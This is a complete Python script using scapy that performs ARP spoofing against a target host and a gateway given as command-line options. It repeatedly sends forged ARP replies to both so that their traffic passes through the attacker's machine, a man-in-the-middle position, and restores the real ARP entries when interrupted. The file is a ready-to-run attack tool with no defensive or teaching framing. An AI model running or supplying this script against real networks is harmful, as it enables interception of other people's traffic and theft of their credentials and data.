import scapy.all as scapy
import time
import optparse

def Get_MAC(ip):
    arp_request_packet = scapy.ARP(pdst=ip)
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined = broadcast_packet/arp_request_packet
    list_answer = scapy.srp(combined,timeout=1,verbose=False)[0]

    return list_answer[0][1].hwsrc

def poison_arp(target_ip,poisoned_ip):

    target_mac = Get_MAC(target_ip)

    arp_response = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=poisoned_ip)
    scapy.send(arp_response,verbose=False)


def res_op(ip_fooled,gateway_ip):

    mac_fooled = Get_MAC(ip_fooled)
    gateway_mac = Get_MAC(gateway_ip)

    arp_response = scapy.ARP(op=2,pdst=ip_fooled,hwdst=mac_fooled,psrc=gateway_ip,hwsrc=gateway_mac)
    scapy.send(arp_response,verbose=False,count=6)

def user_inp():
    parse_object = optparse.OptionParser()

    parse_object.add_option("-t", "--target",dest="target_ip",help="Enter Target IP")
    parse_object.add_option("-g","--gateway",dest="gateway_ip",help="Enter Gateway IP")

    options = parse_object.parse_args()[0]

    if not options.target_ip:
        print("Enter Target IP")

    if not options.gateway_ip:
        print("Enter Gateway IP")

    return options

number = 0

user_ips = user_inp()
user_target_ip = user_ips.target_ip
user_gateway_ip = user_ips.gateway_ip

try:
    while True:

        poison_arp(user_target_ip,user_gateway_ip)
        poison_arp(user_gateway_ip,user_target_ip)

        number += 2

        print("\rSending packets " + str(number),end="")

        time.sleep(3)
except KeyboardInterrupt:
    print("\nQuit & Reset")
    res_op(user_target_ip,user_gateway_ip)
    res_op(user_gateway_ip,user_target_ip)

